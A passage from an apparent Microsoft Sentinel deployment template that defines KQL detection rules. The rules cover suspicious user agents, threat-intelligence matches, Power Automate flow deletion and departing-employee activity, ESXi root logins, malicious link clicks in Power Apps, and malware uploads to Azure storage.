UserIdentityUserName, Type, EventName\n),\n(SigninLogs\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = IPAddress, Account = UserPrincipalName, Type, Operation = OperationName, tostring(LocationDetails), tostring(DeviceDetail),    AppDisplayName, ClientAppUsed\n),\n(AADNonInteractiveUserSignInLogs \n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = IPAddress, Account = UserPrincipalName, Type, Operation = OperationName, tostring(LocationDetails), tostring(DeviceDetail), AppDisplayName, ClientAppUsed\n),\n(_Im_WebSession (httpuseragent_has_any=array_concat(UserAgentString,UARegexMinimalString))\n| where HttpUserAgent has_any (UserAgentString) or HttpUserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by HttpUserAgent, SourceIP = SrcIpAddr, DstIpAddr, Account = SrcUsername, Url, Type\n)\n)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "29283b22-a1c0-4d16-b0a9-3460b655a46a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Account"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.9"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a4a214fa-dbe0-401f-9a57-a89839c84e77')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a4a214fa-dbe0-401f-9a57-a89839c84e77')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Domain entity to EmailUrlInfo",
          "description": "Identifies a match in EmailUrlInfo table from any Domain IOC from TI.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h; // Define the lookback period for email data as 1 hour\nlet ioc_lookBack = 14d; // Define the lookback period for threat intelligence data as 14 days\nlet EmailUrlInfo_ = EmailUrlInfo\n| where isnotempty(Url) or isnotempty(UrlDomain) // Filter for non-empty URLs or URL domains\n| where TimeGenerated >= ago(dt_lookBack) // Filter for records within the lookback period\n| extend Url = tolower(Url), UrlDomain = tolower(UrlDomain) // Convert URLs and domains to lowercase\n| extend EmailUrlInfo_TimeGenerated = TimeGenerated; // Create a new column for the time generated\nlet EmailEvents_ = EmailEvents\n| where TimeGenerated >= ago(dt_lookBack); // Filter email events within the lookback period\nlet TI_Urls = ThreatIntelligenceIndicator\n| where TimeGenerated >= ago(ioc_lookBack) // Filter threat intelligence indicators within the lookback period\n| where isnotempty(Url) // Filter for non-empty URLs\n| extend Url = tolower(Url) // Convert URLs to lowercase\n| join kind=innerunique (EmailUrlInfo_) on Url // Join with email URL info on URL\n| where Active == true and ExpirationDateTime > now() // Filter for active indicators that haven't expired\n| where EmailUrlInfo_TimeGenerated < ExpirationDateTime // Ensure email info was generated before the indicator expired\n| summarize EmailUrlInfo_TimeGenerated = arg_max(EmailUrlInfo_TimeGenerated, *) by IndicatorId, Url // Get the latest email info for each indicator\n| project EmailUrlInfo_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, Url, UrlLocation, NetworkMessageId; // Select relevant columns\nlet TI_Domains = ThreatIntelligenceIndicator\n| where TimeGenerated >= ago(ioc_lookBack) // Filter threat intelligence indicators within the lookback period\n| where isnotempty(DomainName) // Filter for non-empty domain names\n| extend DomainName = tolower(DomainName) // Convert domain names to lowercase\n| join kind=innerunique (EmailUrlInfo_) on $left.DomainName == $right.UrlDomain // Join with email URL info on domain name\n| where Active == true and ExpirationDateTime > now() // Filter for active indicators that haven't expired\n| where EmailUrlInfo_TimeGenerated < ExpirationDateTime // Ensure email info was generated before the indicator expired\n| summarize EmailUrlInfo_TimeGenerated = arg_max(EmailUrlInfo_TimeGenerated, *) by IndicatorId, UrlDomain // Get the latest email info for each indicator\n| project EmailUrlInfo_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, UrlDomain, UrlLocation, NetworkMessageId; // Select relevant columns\nunion TI_Urls, TI_Domains // Combine URL and domain threat intelligence data\n| extend timestamp = EmailUrlInfo_TimeGenerated // Add a timestamp column\n| join kind=inner (EmailEvents_) on NetworkMessageId // Join with email events on network message ID\n| where DeliveryAction !has \"Blocked\" // Filter out blocked delivery actions\n| extend Name = tostring(split(RecipientEmailAddress, '@', 0)[0]), UPNSuffix = tostring(split(RecipientEmailAddress, '@', 1)[0]); // Extract name and UPN suffix from recipient email address\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "87cc75df-d7b2-44f1-b064-ee924edfc879",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "RecipientEmailAddress"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c22de0d7-124a-43d3-9bad-f3dae18227de')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c22de0d7-124a-43d3-9bad-f3dae18227de')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Power Automate - Unusual bulk deletion of flow resources",
          "description": "Identifies bulk deletion of Power Automate flows that exceed a predefined threshold defined in the query and deviate from activity patterns observed in the last 14 days.",
          "severity": "Medium",
          "enabled": true,
          "query": "// minThreshold: Minimum number of apps to be deleted to be considered an anomaly;\n// This is to prevent one-off isolated delete flow to be considered outlier.\n// The Min Threshold can be reduced or increased according to the traffic in the organization.\nlet minThreshold=10;\nlet interval = 1h;\nlet startTime = ago(14d);\nlet endTime = now();\nlet query_frequency = 1h;\nlet flow_deletion_events = PowerAutomateActivity\n    | where TimeGenerated >= startTime\n    | where EventOriginalType =~ \"DeleteFlow\"\n    | extend IngestionTimeGenerated = TimeGenerated;\nflow_deletion_events\n| make-series DeletedFlowCount=count() on IngestionTimeGenerated from startTime to endTime step interval by ActorName, UserUpn, ActorUserId\n| extend(Anomalies, AnomalyScore, ExpectedUsage) = series_decompose_anomalies(DeletedFlowCount)\n| mv-expand\n    DeletedFlowCount to typeof(double),\n    IngestionTimeGenerated to typeof(datetime),\n    Anomalies to typeof(double),\n    AnomalyScore to typeof(double),\n    ExpectedUsage to typeof(long)\n| where IngestionTimeGenerated >= ago(query_frequency)\n| where Anomalies != 0 and DeletedFlowCount >= minThreshold\n| lookup (flow_deletion_events\n    | where IngestionTimeGenerated >= ago(query_frequency))\n    on ActorName, UserUpn, ActorUserId\n| extend\n    AccountName = tostring(split(ActorName, \"@\")[0]),\n    UPNSuffix = tostring(split(ActorName, \"@\")[1]),\n    PowerAutomateAppId = 27592\n| project\n    TimeGenerated,\n    ActorName,\n    DeletedFlowCount,\n    ExpectedUsage,\n    Anomalies,\n    AnomalyScore,\n    AccountName,\n    UPNSuffix,\n    PowerAutomateAppId,\n    UserUpn,\n    ActorUserId\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1485",
            "T0828",
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "56cb646e-56a0-4f0e-8866-9bc1dd15da78",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "Power Automate - unusual bulk deletion of {{DeletedFlowCount}} flows",
            "alertDescriptionFormat": "User {{ActorName}}  deleted {{DeletedFlowCount}} flows in the last hour, surpassing the bulk delete threshold. This is anomalous compared to the past 14 days."
          },
          "customDetails": {
            "DeletedFlowCount": "DeletedFlowCount"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "CloudApplication",
              "fieldMappings": [
                {
                  "identifier": "AppId",
                  "columnName": "PowerAutomateAppId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "3.2.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9b106fe8-a8a2-4fd7-b3fd-95e5d99e3bd4')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9b106fe8-a8a2-4fd7-b3fd-95e5d99e3bd4')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Power Automate - Departing employee flow activity",
          "description": "Identifies instances where an employee who has been notified or is already terminated, on the TerminatedEmployees watchlist, creates or modifies a Power Automate flow.",
          "severity": "High",
          "enabled": true,
          "query": "let query_frequency = 1h;\nPowerAutomateActivity\n| where TimeGenerated >= ago(query_frequency)\n| where EventOriginalType in (\"CreateFlow\", \"EditFlow\")\n| join kind=inner (MSBizAppsTerminatedEmployees()) on $left.ActorName == $right.UserPrincipalName\n| extend path = parse_url(FlowDetailsUrl).Path\n| extend EnvironmentId = tostring(split(path, \"/\")[2])\n| extend FlowId = tostring(split(path, \"/\")[-2])\n| extend\n    AccountName = tostring(split(ActorName, \"@\")[0]),\n    UPNSuffix = tostring(split(ActorName, \"@\")[1]),\n    PowerAutomateAppId = 27592,\n    CloudAppId = 32780\n| project\n    TimeGenerated,\n    EventOriginalType,\n    ActorName,\n    EnvironmentId,\n    AccountName,\n    UPNSuffix,\n    PowerAutomateAppId,\n    CloudAppId,\n    FlowId\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration",
            "Impact"
          ],
          "techniques": [
            "T1567",
            "T1485",
            "T1491",
            "T0813",
            "T0879",
            "T0826"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "b1e11b8c-545a-4dea-a912-0008e160d183",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "PowerAutomate - Terminated user {{EventOriginalType}} detected",
            "alertDescriptionFormat": "{{ActorName}} is on the terminated employees watchlist and carried out {{EventOriginalType}} in environment id {{EnvironmentId}}."
          },
          "customDetails": {
            "Environment": "EnvironmentId",
            "FlowDetails": "FlowId"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "CloudApplication",
              "fieldMappings": [
                {
                  "identifier": "AppId",
                  "columnName": "PowerAutomateAppId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "3.2.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/72601a00-df6e-41c8-8611-16a2e744cb0d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/72601a00-df6e-41c8-8611-16a2e744cb0d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Root login",
          "description": "Detects when root user login from uncommon IP address.",
          "severity": "High",
          "enabled": true,
          "query": "let p_lookback = 14d;\nlet t_lookback = 1h;\nlet root_ips = VMwareESXi\n| where TimeGenerated between (ago(p_lookback) .. ago(t_lookback))\n| where SyslogMessage has_all ('UserLoginSessionEvent', 'root', 'logged in')\n| extend SrcIpAddr = extract(@'root@(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})', 1, SyslogMessage)\n| summarize makeset(SrcIpAddr);\nVMwareESXi\n| where TimeGenerated > ago(t_lookback)\n| where SyslogMessage has_all ('UserLoginSessionEvent', 'root', 'logged in')\n| extend SrcIpAddr = extract(@'root@(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})', 1, SyslogMessage)\n| where SrcIpAddr !in (root_ips)\n| extend IPCustomEntity = SrcIpAddr\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "deb448a8-6a9d-4f8c-8a95-679a0a2cd62c",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c7021483-dbf2-40b2-8a7f-342d4ce02319')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c7021483-dbf2-40b2-8a7f-342d4ce02319')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Power Apps - Multiple users access a malicious link after launching new app",
          "description": "Identifies a chain of events, where a new Power App is created, followed by mulitple users launching the app within the detection window and clicking on the same malicious URL.",
          "severity": "High",
          "enabled": true,
          "query": "// Define a threshold (distinct_user_launch_threshold) for\n// the minimum number of users who launched an app\n// to be in scope of this detection\nlet distinct_user_launch_threshold = 2;\n// Define a threshold for the minumum number of users\n// who clicked the same malicious link after launching the app\n// to be in scope of this detection\nlet distinct_user_url_click_threshold = 2;\nlet query_frequency = 1h;\nlet query_lookback = 14d;\nlet new_app_creation_activity = materialize(\n    PowerPlatformAdminActivity\n    | where TimeGenerated >= ago (query_lookback)\n    | where EventOriginalType == \"CreatePowerApp\"\n    | extend Properties = tostring(PropertyCollection)\n    | extend SrcIpAddr = extract(@'\"enduser.ip_address\",\"Value\":\"([^\"]+)\"', 1, Properties)\n    | extend SrcIpAddr = iif(SrcIpAddr startswith '::ffff:', replace_string(SrcIpAddr, '::ffff:', ''), SrcIpAddr)\n    | extend AppId = extract(@'\"powerplatform.analytics.resource.power_app.id\",\"Value\":\"([^\"]+)\"', 1, Properties)\n    | extend AppId = tolower(replace_string(AppId, '/providers/Microsoft.PowerApps/apps/', ''))\n    | extend\n        AppName = extract(@'\"powerplatform.analytics.resource.power_app.display_name\",\"Value\":\"([^\"]+)\"', 1, Properties),\n        EnvironmentId = extract(@'\"powerplatform.analytics.resource.environment.id\",\"Value\":\"([^\"]+)\"', 1, Properties)\n    | project-rename\n        AppCreatedTime = TimeGenerated,\n        AppCreator = ActorName,\n        AppCreatorIpAddr = SrcIpAddr\n    );\nlet distinct_apps = new_app_creation_activity\n    | distinct AppName;\nlet new_app_launch_activity = materialize(\n    new_app_creation_activity\n    | join kind=inner (\n        PowerPlatformAdminActivity\n        | where TimeGenerated >= ago (query_lookback)\n        | where EventOriginalType == \"LaunchPowerApp\"\n        | where PropertyCollection has_any (distinct_apps)\n        | extend Properties = tostring(PropertyCollection)\n        | extend AppName = extract(@'\"powerplatform.analytics.resource.power_app.display_name\",\"Value\":\"([^\"]+)\"', 1, Properties)\n        | summarize FirstAppLaunchTime = min(TimeGenerated) by ActorName, AppName)\n        on AppName\n    | where FirstAppLaunchTime > AppCreatedTime\n    );\nlet new_app_launch_users = new_app_launch_activity\n    | summarize LaunchCount = dcount(ActorName) by AppName\n    | where LaunchCount > distinct_user_launch_threshold\n    | join kind=inner new_app_launch_activity on AppName\n    | summarize\n        by\n        ActorName,\n        FirstAppLaunchTime,\n        AppName,\n        AppId,\n        EnvironmentId,\n        AppCreator,\n        AppCreatorIpAddr;\nlet detected_urls = union isfuzzy=true\n        (\n        SecurityAlert\n        | where TimeGenerated >= ago (query_lookback)\n        | where Entities has_cs '\"Type\":\"url\"'\n        | mv-expand todynamic(Entities)\n        | where tostring(Entities.Type) == \"url\"\n        | project Url = tostring(Entities.Url), Source = \"SecurityAlert\"\n        ),\n        (\n        ThreatIntelligenceIndicator\n        | where TimeGenerated >= ago(query_lookback)\n        | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n        | where Active == true and ExpirationDateTime > now()\n        | where isnotempty(isnotempty(Url))\n        | project Url, Source = \"ThreatIntelligence\"\n        )\n    | summarize by Url, Source;\nlet url_click_events = materialize(\n    union isfuzzy=true\n        (\n        UrlClickEvents\n        | where TimeGenerated >= ago(query_frequency)\n        | where isnotempty(ThreatTypes)\n        | join kind=inner (new_app_launch_users) on $left.AccountUpn == $right.ActorName\n        | where TimeGenerated between (FirstAppLaunchTime .. (FirstAppLaunchTime + 1h))\n        | summarize by ActorName, Url, Source = \"MicrosoftDefender\"\n        ),\n        (\n        _Im_WebSession\n        | where TimeGenerated >= ago(query_frequency)\n        | join kind=inner (new_app_launch_users) on $left.SrcUsername == $right.ActorName\n        | join kind=inner (detected_urls) on Url\n        | where TimeGenerated between (FirstAppLaunchTime .. (FirstAppLaunchTime + 1h))\n        | summarize by ActorName, Url, Source\n        )\n    );\nlet distinct_url_click_events_count = toscalar(\n    url_click_events\n    | summarize DistinctUserCount = dcount(ActorName) by Url\n    | where DistinctUserCount > distinct_user_url_click_threshold\n    | summarize sum(DistinctUserCount)\n    );\nurl_click_events\n| summarize DistinctUserCount = dcount(ActorName) by Url\n| where DistinctUserCount >= distinct_user_url_click_threshold\n| join kind=inner url_click_events on Url\n| join kind=inner (new_app_launch_users) on ActorName\n| extend\n    PowerAppsEntityId = 27593,\n    DataverseId = 32780,\n    AccountName = tostring(split(ActorName, '@')[0]),\n    UPNSuffix = tostring(split(ActorName, '@')[1])\n| project\n    FirstAppLaunchTime,\n    AppCreator,\n    AppName,\n    AppId,\n    ImpactedUser = ActorName,\n    AccountName,\n    UPNSuffix,\n    EnvironmentId,\n    Url,\n    Source,\n    PowerAppsEntityId\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1189",
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "4bd7e93a-0646-4e02-8dcb-aa16d16618f4",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "Possible malicious app detected - {{AppName}} ",
            "alertDescriptionFormat": "Multiple users opened a malicious link after launching app {{AppName}}.  Click here to navigate to the Power Apps Portal to examine the app: https://make.powerapps.com/environments/{{EnvironmentId}}/apps"
          },
          "customDetails": {
            "AppCreator": "AppCreator",
            "Environment": "EnvironmentId",
            "PowerAppsApp": "AppId",
            "PowerAppsAppName": "AppName"
          },
          "entityMappings": [
            {
              "entityType": "CloudApplication",
              "fieldMappings": [
                {
                  "identifier": "AppId",
                  "columnName": "PowerAppsEntityId"
                },
                {
                  "identifier": "InstanceName",
                  "columnName": "AppName"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AppCreator"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "3.2.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6f836c34-bca1-4d6d-bab7-17cd60f74594')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6f836c34-bca1-4d6d-bab7-17cd60f74594')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map IP Entity to CommonSecurityLog",
          "description": "This query maps any IP indicators of compromise (IOCs) from threat intelligence (TI), by searching for matches in CommonSecurityLog.",
          "severity": "Medium",
          "enabled": false,
          "query": "let IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\nlet dt_lookBack = 1h; // Look back 1 hour for CommonSecurityLog events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = ThreatIntelligenceIndicator\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n  | where ipv4_is_private(TI_ipEntity) == false and  TI_ipEntity !startswith \"fe80\" and TI_ipEntity !startswith \"::\" and TI_ipEntity !startswith \"127.\"\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now();\n// Perform a join between IP indicators and CommonSecurityLog events\nIP_Indicators\n  // Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n  | join kind=innerunique (\n      CommonSecurityLog\n      | where TimeGenerated >= ago(dt_lookBack)\n      | extend MessageIP = extract(IPRegex, 0, Message)\n      | extend CS_ipEntity = iff((not(ipv4_is_private(SourceIP)) and isnotempty(SourceIP)), SourceIP, DestinationIP)\n      | extend CS_ipEntity = iff(isempty(CS_ipEntity) and isnotempty(MessageIP), MessageIP, CS_ipEntity)\n      | extend CommonSecurityLog_TimeGenerated = TimeGenerated\n  )\n  on $left.TI_ipEntity == $right.CS_ipEntity\n  // Filter out logs that occurred after the expiration of the corresponding indicator\n  | where CommonSecurityLog_TimeGenerated < ExpirationDateTime\n  // Group the results by IndicatorId and CS_ipEntity, and keep the log entry with the latest timestamp\n  | summarize CommonSecurityLog_TimeGenerated = arg_max(CommonSecurityLog_TimeGenerated, *) by IndicatorId, CS_ipEntity\n  // Select the desired output fields\n  | project timestamp = CommonSecurityLog_TimeGenerated, SourceIP, DestinationIP, MessageIP, Message, DeviceVendor, DeviceProduct, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, TI_ipEntity, CS_ipEntity, LogSeverity, DeviceAction, Type\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "66c81ae2-1f89-4433-be00-2fbbd9ba5ebe",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CS_ipEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/104ba5c6-db0c-4d4a-8db7-ee948050d4d3')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/104ba5c6-db0c-4d4a-8db7-ee948050d4d3')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Linked Malicious Storage Artifacts",
          "description": "This query identifies the additional files uploaded by the same IP address which triggered a malware alert for malicious content upload on Azure Blob or File Storage Container.",
          "severity": "Medium",
          "enabled": true,
          "query": "//Collect the alert events\nlet alertData = SecurityAlert\n| where DisplayName has \"Potential malware uploaded to\"\n| extend Entities = parse_json(Entities)\n| mv-expand Entities;\n//Parse the IP address data\nlet ipData = alertData\n| where Entities['Type'] =~ \"ip\"\n| extend AttackerIP = tostring(Entities['Address']), AttackerCountry = tostring(Entities['Location']['CountryName']);\n//Parse the file data\nlet FileData = alertData\n| where Entities['Type'] =~ \"file\"\n| extend MaliciousFileDirectory = tostring(Entities['Directory']), MaliciousFileName = tostring(Entities['Name']), MaliciousFileHashes = tostring(Entities['FileHashes']);\n//Combine the File and IP data together\nipData\n| join (FileData) on VendorOriginalId\n| summarize by TimeGenerated, AttackerIP, AttackerCountry, DisplayName, ResourceId, AlertType, MaliciousFileDirectory, MaliciousFileName, MaliciousFileHashes\n//Create a type column so we can track if it was a File storage or blobl storage upload\n| extend type = iff(DisplayName has \"file\", \"File\", \"Blob\")\n| join (\n  union\n  StorageFileLogs,\n  StorageBlobLogs\n  //File upload operations\n  | where 